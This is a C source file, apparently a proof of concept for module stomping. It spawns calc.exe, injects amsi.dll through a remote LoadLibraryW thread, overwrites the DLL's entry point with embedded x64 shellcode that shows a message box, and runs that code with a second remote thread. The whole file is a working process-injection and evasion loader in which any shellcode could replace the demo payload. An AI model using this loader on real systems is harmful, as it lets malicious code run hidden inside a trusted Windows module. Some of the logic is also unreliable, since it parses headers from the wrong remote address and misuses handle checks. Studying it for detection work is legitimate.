#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

int main()
{
	STARTUPINFOA			startupInfo;
	PROCESS_INFORMATION		processInformation;
	DWORD					dwPid;
	DWORD					dwModulesSizeNeeded = 0;
	const DWORD				headerBufferSize = 0x1000;
	FARPROC					llLoadLibraryWAddress;
	HANDLE					hProcessHandle;
	HANDLE					hDllThread;
	HMODULE					hKernel32;
	HMODULE					hRemoteModule;
	HMODULE					modules[256] = { 0 };
	const SIZE_T			ullModulesSize = sizeof(modules);
	SIZE_T					ullModulesCount;
	PVOID					pRemoteBuffer;
	LPVOID					pTargetProcessHeaderBuffer;
	LPVOID					pDllEntryPoint;
	WCHAR					cModuleToInject[] = L"C:\\windows\\system32\\amsi.dll";
	CHAR					cRemoteModuleName[128] = { 0 };
	BYTE					bMessageboxShellcode64[] = "\x48\x89\x5C\x24\x18\x48\x89\x7C\x24\x20\x55\x48\x8D\x6C\x24\xA9\x48\x81\xEC\xA0\x00\x00\x00\x33\xDB\xC7\x45\x17\x75\x00\x73\x00\xB9\x13\x9C\xBF\xBD\x48\x89\x5D\x67\x89\x5D\xFB\x89\x5D\x0B\x66\x89\x5D\x47\xC7\x45\x1B\x65\x00\x72\x00\xC7\x45\x1F\x33\x00\x32\x00\xC7\x45\x23\x2E\x00\x64\x00\xC7\x45\x27\x6C\x00\x6C\x00\xC7\x45\xD7\x4D\x65\x73\x73\xC7\x45\xDB\x61\x67\x65\x42\xC7\x45\xDF\x6F\x78\x57\x00\xC7\x45\x2F\x48\x00\x65\x00\xC7\x45\x33\x6C\x00\x6C\x00\xC7\x45\x37\x6F\x00\x20\x00\xC7\x45\x3B\x57\x00\x6F\x00\xC7\x45\x3F\x72\x00\x6C\x00\xC7\x45\x43\x64\x00\x21\x00\xC7\x45\xE7\x44\x00\x65\x00\xC7\x45\xEB\x6D\x00\x6F\x00\xC7\x45\xEF\x21\x00\x00\x00\xE8\x74\x00\x00\x00\xB9\xB5\x41\xD9\x5E\x48\x8B\xD8\xE8\x67\x00\x00\x00\x48\x8B\xF8\xC7\x45\xF7\x14\x00\x14\x00\x48\x8D\x45\x17\x33\xD2\x4C\x8D\x4D\x6F\x48\x89\x45\xFF\x4C\x8D\x45\xF7\x33\xC9\xFF\xD3\x48\x8B\x4D\x6F\x48\x8D\x45\xD7\x45\x33\xC0\x48\x89\x45\x0F\x4C\x8D\x4D\x67\xC7\x45\x07\x0C\x00\x0C\x00\x48\x8D\x55\x07\xFF\xD7\x45\x33\xC9\x4C\x8D\x45\xE7\x48\x8D\x55\x2F\x33\xC9\xFF\x55\x67\x4C\x8D\x9C\x24\xA0\x00\x00\x00\x49\x8B\x5B\x20\x49\x8B\x7B\x28\x49\x8B\xE3\x5D\xC3\xCC\xCC\x48\x8B\xC4\x48\x89\x58\x08\x48\x89\x68\x10\x48\x89\x70\x18\x48\x89\x78\x20\x41\x56\x48\x83\xEC\x10\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x8B\xE9\x45\x33\xF6\x48\x8B\x50\x18\x4C\x8B\x4A\x10\x4D\x8B\x41\x30\x4D\x85\xC0\x0F\x84\xB3\x00\x00\x00\x41\x0F\x10\x41\x58\x49\x63\x40\x3C\x41\x8B\xD6\x4D\x8B\x09\xF3\x0F\x7F\x04\x24\x46\x8B\x9C\x00\x88\x00\x00\x00\x45\x85\xDB\x74\xD2\x48\x8B\x04\x24\x48\xC1\xE8\x10\x66\x44\x3B\xF0\x73\x22\x48\x8B\x4C\x24\x08\x44\x0F\xB7\xD0\x0F\xBE\x01\xC1\xCA\x0D\x80\x39\x61\x7C\x03\x83\xC2\xE0\x03\xD0\x48\xFF\xC1\x49\x83\xEA\x01\x75\xE7\x4F\x8D\x14\x18\x45\x8B\xDE\x41\x8B\x7A\x20\x49\x03\xF8\x45\x39\x72\x18\x76\x8E\x8B\x37\x41\x8B\xDE\x49\x03\xF0\x48\x8D\x7F\x04\x0F\xBE\x0E\x48\xFF\xC6\xC1\xCB\x0D\x03\xD9\x84\xC9\x75\xF1\x8D\x04\x13\x3B\xC5\x74\x0E\x41\xFF\xC3\x45\x3B\x5A\x18\x72\xD5\xE9\x5E\xFF\xFF\xFF\x41\x8B\x42\x24\x43\x8D\x0C\x1B\x49\x03\xC0\x0F\xB7\x14\x01\x41\x8B\x4A\x1C\x49\x03\xC8\x8B\x04\x91\x49\x03\xC0\xEB\x02\x33\xC0\x48\x8B\x5C\x24\x20\x48\x8B\x6C\x24\x28\x48\x8B\x74\x24\x30\x48\x8B\x7C\x24\x38\x48\x83\xC4\x10\x41\x5E\xC3";
	PTHREAD_START_ROUTINE	threadRoutine;
	PIMAGE_DOS_HEADER		dosHeader;
	PIMAGE_NT_HEADERS		ntHeader;

	ZeroMemory(&startupInfo, sizeof(startupInfo));
	startupInfo.cb = sizeof(startupInfo);
	ZeroMemory(&processInformation, sizeof(processInformation));

	if (!CreateProcessA(NULL, "\"calc.exe\"", NULL, NULL, FALSE,
		DETACHED_PROCESS, NULL, NULL, &startupInfo, &processInformation)) {
		printf("[-] CreateProcess failed: (%lu).\n", GetLastError());
		goto Cleanup;
	}

	dwPid = processInformation.dwProcessId;
	if ((hProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPid)) == INVALID_HANDLE_VALUE) {
		printf("[-] Could not get handle to target process: (%lu).\n", GetLastError());
		goto Cleanup;
	}

	if ((pRemoteBuffer = VirtualAllocEx(hProcessHandle, NULL, sizeof(cModuleToInject), MEM_COMMIT, PAGE_READWRITE)) == NULL) {
		printf("[-] Failed allocating memory in target process: (%lu).\n", GetLastError());
		goto Cleanup;
	}

	if (!WriteProcessMemory(hProcessHandle, pRemoteBuffer, (LPVOID)cModuleToInject, sizeof(cModuleToInject), NULL)) {
		printf("[-] Failed writing memory in target process: (%lu).\n", GetLastError());
		goto Cleanup;
	}

	if ((hKernel32 = GetModuleHandle(TEXT("Kernel32"))) == INVALID_HANDLE_VALUE) {
		printf("[-] Unable to get a handle on Kernel32: (%lu).\n", GetLastError());
		goto Cleanup;
	}

	llLoadLibraryWAddress = GetProcAddress(hKernel32, "LoadLibraryW");
	threadRoutine = (PTHREAD_START_ROUTINE)llLoadLibraryWAddress;
	
	if ((hDllThread = CreateRemoteThread(hProcessHandle, NULL, 0, threadRoutine, pRemoteBuffer, 0, NULL)) != INVALID_HANDLE_VALUE) {
		WaitForSingleObject(hDllThread, 1000);

		// find base address of the injected benign DLL in remote process
		EnumProcessModules(hProcessHandle, modules, ullModulesSize, &dwModulesSizeNeeded);
		ullModulesCount = dwModulesSizeNeeded / sizeof(HMODULE);
		for (size_t i = 0; i < ullModulesCount; i++)
		{
			hRemoteModule = modules[i];
			GetModuleBaseNameA(hProcessHandle, hRemoteModule, cRemoteModuleName, sizeof(cRemoteModuleName));

			if (strcmp(cRemoteModuleName, "amsi.dll") == 0)
			{
				printf("[+] %s at %p\n", cRemoteModuleName, (VOID*)modules[i]);
				break;
			}
		}

		// get DLL's AddressOfEntryPoint
		if ((pTargetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize)) == NULL) {
			printf("[-] Unable to get DLL's AddressOfEntryPoint: (%lu).\n", GetLastError());
			goto Cleanup;
		}

		ReadProcessMemory(hProcessHandle, pRemoteBuffer, pTargetProcessHeaderBuffer, headerBufferSize, NULL);

		dosHeader = (PIMAGE_DOS_HEADER)pTargetProcessHeaderBuffer;
		ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)pTargetProcessHeaderBuffer + dosHeader->e_lfanew);
		pDllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)pRemoteBuffer);

		// write shellcode to DLL's AddressofEntryPoint
		if (!WriteProcessMemory(hProcessHandle, pDllEntryPoint, (LPCVOID)bMessageboxShellcode64, sizeof(bMessageboxShellcode64), NULL)) {
			printf("[-] Unable to write shellcode to DLL's AddressofEntryPoint: (%lu).\n", GetLastError());
			goto Cleanup;
		}

		// execute shellcode from inside the benign DLL
		CreateRemoteThread(hProcessHandle, NULL, 0, (PTHREAD_START_ROUTINE)pDllEntryPoint, NULL, 0, NULL);
	}

Cleanup:
	CloseHandle(processInformation.hProcess);
	CloseHandle(processInformation.hThread);
}
